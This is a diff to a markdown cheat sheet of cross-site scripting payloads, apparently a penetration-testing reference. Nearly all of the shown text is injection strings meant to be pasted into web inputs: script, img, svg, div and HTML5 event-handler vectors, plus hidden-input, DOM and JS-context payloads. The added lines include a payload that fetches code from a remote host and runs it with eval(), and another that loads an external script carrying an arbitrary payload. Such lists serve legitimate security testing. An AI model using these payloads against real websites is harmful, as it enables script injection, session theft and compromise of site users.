@@ -11,6 +11,12 @@ Cross-site scripting (XSS) is a type of computer security vulnerability typicall
   - [Other ways](#other-ways)
 - [Identify an XSS endpoint](#identify-an-xss-endpoint)
 - [XSS in HTML/Applications](#xss-in-htmlapplications)
+  - [Common Payloads](#common-payloads)
+  - [XSS using HTML5 tags](#xss-using-html5-tags)
+  - [XSS using a remote JS](#xss-using-a-remote-js)
+  - [XSS in hidden input](#xss-in-hidden-input)
+  - [DOM based XSS](#dom-based-xss)
+  - [XSS in JS Context](#xss-in-js-context)
 - [XSS in wrappers javascript and data URI](#xss-in-wrappers-javascript-and-data-uri)
 - [XSS in files (XML/SVG/CSS/Flash/Markdown)](#xss-in-files)
 - [XSS in PostMessage](#xss-in-postmessage)
@@ -119,16 +125,16 @@ More exploits at [http://www.xss-payloads.com/payloads-list.html?a#category=all]
 
 ## XSS in HTML/Applications
 
-XSS Basic
+### Common Payloads
 
 ```javascript
-Basic payload
+// Basic payload
 <script>alert('XSS')</script>
 <scr<script>ipt>alert('XSS')</scr<script>ipt>
 "><script>alert('XSS')</script>
 "><script>alert(String.fromCharCode(88,83,83))</script>
 
-Img payload
+// Img payload
 <img src=x onerror=alert('XSS');>
 <img src=x onerror=alert('XSS')//
 <img src=x onerror=alert(String.fromCharCode(88,83,83));>
@@ -137,7 +143,7 @@ Img payload
 "><img src=x onerror=alert('XSS');>
 "><img src=x onerror=alert(String.fromCharCode(88,83,83));>
 
-Svg payload
+// Svg payload
 <svgonload=alert(1)>
 <svg/onload=alert('XSS')>
 <svg onload=alert(1)//
@@ -147,7 +153,7 @@ Svg payload
 "><svg/onload=alert(/XSS/)
 <svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)
 
-Div payload
+// Div payload
 <div onpointerover="alert(45)">MOVE HERE</div>
 <div onpointerdown="alert(45)">MOVE HERE</div>
 <div onpointerenter="alert(45)">MOVE HERE</div>
@@ -157,7 +163,7 @@ Div payload
 <div onpointerup="alert(45)">MOVE HERE</div>
 ```
 
-XSS for HTML5
+### XSS using HTML5 tags
 
 ```javascript
 <body onload=alert(/XSS/.source)>
@@ -178,40 +184,36 @@ XSS for HTML5
 <body ontouchmove=alert(1)>  // When a finger is dragged across the screen.
 ```
 
-XSS using script tag (external payload)
+### XSS using a remote JS
 
-```javascript
+```html
+<svg/onload='fetch("//host/a").then(r=>r.text().then(t=>eval(t)))'>
 <script src=14.rs>
-you can also specify an arbitratry payload with 14.rs/#payload
+// you can also specify an arbitrary payload with 14.rs/#payload
 e.g: 14.rs/#alert(document.domain)
 ```
 
-XSS in Hidden input
+### XSS in hidden input
 
 ```javascript
 <input type="hidden" accesskey="X" onclick="alert(1)">
 Use CTRL+SHIFT+X to trigger the onclick event
 ```
 
-DOM XSS
+### DOM based XSS
+
+Based on a DOM XSS sink.
 
 ```javascript
 #"><img src=/ onerror=alert(2)>
 ```
 
-XSS in JS Context (payload without quote/double quote from [@brutelogic](https://twitter.com/brutelogic)
+### XSS in JS Context 
 
 ```javascript
 -(confirm)(document.domain)//
 ; alert(1);//
-```
-
-XSS URL
-
-```javascript
-URL/<svg onload=alert(1)>
-URL/<script>alert('XSS');//
-URL/<input autofocus onfocus=alert(1)>
+// (payload without quote/double quote from [@brutelogic](https://twitter.com/brutelogic)
 ```
 
 ## XSS in wrappers javascript and data URI
